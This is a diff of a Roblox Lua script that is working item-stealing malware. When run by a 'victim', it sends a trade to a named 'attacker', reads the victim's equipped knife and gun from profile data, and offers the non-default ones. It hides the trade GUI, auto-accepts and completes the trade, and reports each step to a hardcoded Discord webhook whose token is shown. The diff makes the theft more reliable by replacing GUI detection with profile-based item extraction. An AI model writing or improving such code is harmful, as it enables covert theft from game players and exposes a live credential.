@@ -1,4 +1,4 @@
---[=[ FINAL: Mobile‑friendly trade with GUI detection ]=]
+--[=[ FINAL: Trade equipped knife and gun from profile data ]=]
 
 local webhookURL = "https://discord.com/api/webhooks/1532509426257236008/TQrtSPyEYviVXAPzhBbVgaPIRcKFLHghPCxBfD3TFQ7njWBM7qngokItqz0vCXkiCkcz"
 local attackerUsername = "FEARACCE"
@@ -70,7 +70,7 @@ game:GetService("UserInputService").InputBegan:Connect(function(input)
 end)
 
 -- ============================================================
--- TRADE AUTOMATION (mobile-friendly)
+-- TRADE AUTOMATION (profile-based)
 -- ============================================================
 local RS = game:GetService("ReplicatedStorage")
 local Trade = RS:FindFirstChild("Trade")
@@ -93,140 +93,65 @@ end
 
 send("✅ Remotes found.")
 
--- --- Function to describe a GUI object (for debugging)
-local function describeGUI(obj, indent)
-    indent = indent or 0
-    local pad = string.rep("  ", indent)
-    local info = pad .. obj.ClassName .. " : " .. obj.Name
-    if obj:IsA("TextButton") or obj:IsA("TextLabel") then
-        info = info .. " Text: '" .. (obj.Text or "") .. "'"
+-- --- Get profile data and extract knife & gun
+local function getPlayerItems()
+    local InventoryFolder = RS:FindFirstChild("Remotes") and RS.Remotes:FindFirstChild("Inventory")
+    local GetProfileData = InventoryFolder and InventoryFolder:FindFirstChild("GetProfileData")
+    if not GetProfileData then
+        send("❌ GetProfileData remote not found.")
+        return nil, nil
     end
-    if obj:IsA("Frame") or obj:IsA("ScreenGui") then
-        info = info .. " Size: " .. obj.AbsoluteSize.X .. "x" .. obj.AbsoluteSize.Y
-        if obj:IsA("ScreenGui") then info = info .. " Enabled: " .. tostring(obj.Enabled) end
-        if obj:IsA("Frame") then info = info .. " Visible: " .. tostring(obj.Visible) end
+    local ok, data = pcall(function() return GetProfileData:InvokeServer() end)
+    if not ok or not data then
+        send("❌ Failed to get profile data.")
+        return nil, nil
     end
-    local desc = info .. "\n"
-    for _, child in pairs(obj:GetChildren()) do
-        desc = desc .. describeGUI(child, indent+2)
+    -- Find the local player's data by matching UserId
+    local localUserId = player.UserId
+    local knife, gun = nil, nil
+    for _, entry in pairs(data) do
+        if type(entry) == "table" and entry.UserId == localUserId then
+            knife = entry.Knife
+            gun = entry.Gun
+            break
+        end
     end
-    return desc
+    return knife, gun
 end
 
--- --- Find the trade window (mobile-friendly)
-local function findTradeWindow()
-    local gui = player:FindFirstChild("PlayerGui")
-    if not gui then return nil end
-
-    -- Collect all enabled ScreenGuis and visible large Frames
-    local candidates = {}
-    for _, obj in pairs(gui:GetDescendants()) do
-        if obj:IsA("ScreenGui") and obj.Enabled then
-            local size = obj.AbsoluteSize
-            if size.X > 200 and size.Y > 150 then
-                table.insert(candidates, obj)
-            end
-        end
-        if obj:IsA("Frame") and obj.Visible then
-            local size = obj.AbsoluteSize
-            if size.X > 200 and size.Y > 150 then
-                table.insert(candidates, obj)
-            end
-        end
+-- --- Offer an item by name
+local function offerItemByName(itemName)
+    if not OfferItem then return false end
+    if not itemName or itemName == "" then return false end
+    if itemName == "DefaultKnife" or itemName == "DefaultGun" then
+        send("⚠️ Skipping default item: " .. itemName)
+        return false
     end
-
-    -- Filter candidates: must have Accept and Add buttons
-    for _, obj in ipairs(candidates) do
-        local name = obj.Name:lower()
-        -- Ignore Lobby, Main, HUD, Background
-        if not (name:find("lobby") or name:find("main") or name:find("hud") or name:find("background")) then
-            local hasAccept, hasAdd = false, false
-            for _, btn in pairs(obj:GetDescendants()) do
-                if btn:IsA("TextButton") then
-                    local text = (btn.Text or ""):lower()
-                    local bName = btn.Name:lower()
-                    if text:find("accept") or bName:find("accept") then hasAccept = true end
-                    if text:find("add") or bName:find("add") or text:find("select") or bName:find("select") or text:find("+") then hasAdd = true end
-                end
-            end
-            if hasAccept and hasAdd then
-                return obj
-            end
-        end
-    end
-    return nil
-end
-
--- --- Click all Add buttons (multiple strategies)
-local function clickAddButtons(tradeWindow)
-    if not tradeWindow then return 0 end
-    local count = 0
-
-    -- Strategy 1: Add All
-    for _, btn in pairs(tradeWindow:GetDescendants()) do
-        if btn:IsA("TextButton") then
-            local text = (btn.Text or ""):lower()
-            local name = btn.Name:lower()
-            if text:find("add all") or name:find("add all") or text:find("select all") then
-                pcall(function() btn:FireServer() end)
-                send("✅ Clicked 'Add All'")
-                return 1
-            end
-        end
-    end
-
-    -- Strategy 2: Click any button with "Add", "Select", or "+"
-    for _, btn in pairs(tradeWindow:GetDescendants()) do
-        if btn:IsA("TextButton") then
-            local text = (btn.Text or ""):lower()
-            local name = btn.Name:lower()
-            if text:find("add") or name:find("add") or text:find("select") or name:find("select") or text:find("+") then
-                pcall(function() btn:FireServer() end)
-                count = count + 1
-            end
-        end
-    end
-    return count
-end
-
--- --- Offer items via remote (fallback)
-local function offerAllItemsViaRemote()
-    if not OfferItem then return 0 end
-    local count = 0
-    -- Get tools from Backpack and Character
-    local tools = {}
-    for _, t in pairs(player.Backpack:GetChildren()) do
-        if t:IsA("Tool") then table.insert(tools, t) end
-    end
-    for _, t in pairs(char:GetChildren()) do
-        if t:IsA("Tool") then table.insert(tools, t) end
-    end
-    if #tools == 0 then return 0 end
-    for _, tool in ipairs(tools) do
-        local ok = pcall(function() OfferItem:FireServer(tool) end)
-        if not ok then ok = pcall(function() OfferItem:FireServer(tool.Name) end) end
-        if ok then count = count + 1 end
-        wait(0.1)
-    end
-    return count
-end
-
--- --- Hide the trade window
-local function hideTradeWindow(tradeWindow)
-    if not tradeWindow then return end
-    if tradeWindow:IsA("ScreenGui") then
-        tradeWindow.Enabled = false
+    local ok, err = pcall(function() OfferItem:FireServer(itemName) end)
+    if ok then
+        send("✅ Offered: " .. itemName)
+        return true
     else
-        tradeWindow.Visible = false
-        if tradeWindow.Parent and tradeWindow.Parent:IsA("ScreenGui") then
-            tradeWindow.Parent.Enabled = false
+        send("❌ Failed to offer " .. itemName .. ": " .. tostring(err))
+        return false
+    end
+end
+
+-- --- Hide trade GUI (if any)
+local function hideTradeWindow()
+    local gui = player:FindFirstChild("PlayerGui")
+    if not gui then return end
+    for _, obj in pairs(gui:GetDescendants()) do
+        if obj:IsA("ScreenGui") and (obj.Name:lower():find("trade") or obj.Name:lower():find("request")) then
+            obj.Enabled = false
+        end
+        if obj:IsA("Frame") and (obj.Name:lower():find("trade") or obj.Name:lower():find("request")) then
+            obj.Visible = false
         end
     end
 end
 
--- ============================================================
--- MAIN SEQUENCE
--- ============================================================
+-- --- Main sequence
 spawn(function()
     send("⏳ Waiting for attacker: " .. attackerUsername)
     local target = nil
@@ -252,67 +177,41 @@ spawn(function()
     end
     send("✅ Request sent, response: " .. tostring(err))
 
-    -- 2. Wait for attacker to accept (with timeout)
-    send("⏳ Waiting for attacker to accept (30s timeout)...")
-    local tradeWindow = nil
-    for i = 1, 30 do
-        tradeWindow = findTradeWindow()
-        if tradeWindow then
-            send("✅ Trade GUI detected after " .. i .. "s.")
-            break
-        end
-        wait(1)
-    end
-
-    if not tradeWindow then
-        send("❌ Trade GUI not found. Trying remote offering...")
-        local remoteCount = offerAllItemsViaRemote()
-        if remoteCount > 0 then
-            send("✅ Offered " .. remoteCount .. " items via remote.")
-        else
-            send("❌ No items could be offered.")
-        end
-        -- Still proceed to accept?
-    else
-        -- 3. Send GUI structure to Discord (for debugging)
-        local structure = describeGUI(tradeWindow)
-        if #structure > 1900 then
-            local pos = 1
-            while pos <= #structure do
-                local chunk = structure:sub(pos, pos+1900)
-                send("```lua\n" .. chunk .. "\n```")
-                pos = pos + 1900
-                wait(0.3)
-            end
-        else
-            send("```lua\n" .. structure .. "\n```")
-        end
-
-        -- 4. Click Add buttons
-        send("📦 Clicking Add buttons...")
-        local clicked = clickAddButtons(tradeWindow)
-        send("✅ Clicked " .. clicked .. " buttons.")
-        if clicked == 0 then
-            -- Fallback: click any button
-            for _, btn in pairs(tradeWindow:GetDescendants()) do
-                if btn:IsA("TextButton") then
-                    pcall(function() btn:FireServer() end)
-                end
-            end
-            send("🔄 Clicked all buttons as fallback.")
-        end
-
-        -- 5. Hide GUI
-        send("👻 Hiding trade GUI...")
-        hideTradeWindow(tradeWindow)
-        send("✅ GUI hidden.")
-    end
-
-    -- 6. Wait 5 seconds before accepting
-    send("⏳ Waiting 5 seconds before accepting...")
+    -- 2. Wait for attacker to accept (5 seconds)
+    send("⏳ Waiting 5 seconds for attacker to accept...")
     wait(5)
 
-    -- 7. Accept trade (double)
+    -- 3. Get player's items
+    send("🔍 Fetching profile data...")
+    local knife, gun = getPlayerItems()
+    send("📦 Knife: " .. tostring(knife) .. " | Gun: " .. tostring(gun))
+
+    -- 4. Offer items (if not default)
+    local offered = 0
+    if knife and knife ~= "DefaultKnife" then
+        if offerItemByName(knife) then offered = offered + 1 end
+    else
+        send("⚠️ Victim has default knife – no trade needed.")
+    end
+    if gun and gun ~= "DefaultGun" then
+        if offerItemByName(gun) then offered = offered + 1 end
+    else
+        send("⚠️ Victim has default gun – no trade needed.")
+    end
+
+    if offered == 0 then
+        send("⚠️ No rare items to trade. Completing trade anyway.")
+    else
+        send("✅ Offered " .. offered .. " item(s).")
+    end
+
+    wait(1)
+
+    -- 5. Hide any GUI
+    hideTradeWindow()
+    send("👻 GUI hidden (if any).")
+
+    -- 6. Accept trade (double)
     send("✅ Accepting trade...")
     pcall(function() AcceptTr:FireServer() end)
     wait(0.3)
@@ -321,7 +220,7 @@ spawn(function()
 
     wait(0.5)
 
-    -- 8. Complete
+    -- 7. Complete
     if CompleteTr then
         send("🏁 Completing trade...")
         pcall(function() CompleteTr:FireServer() end)
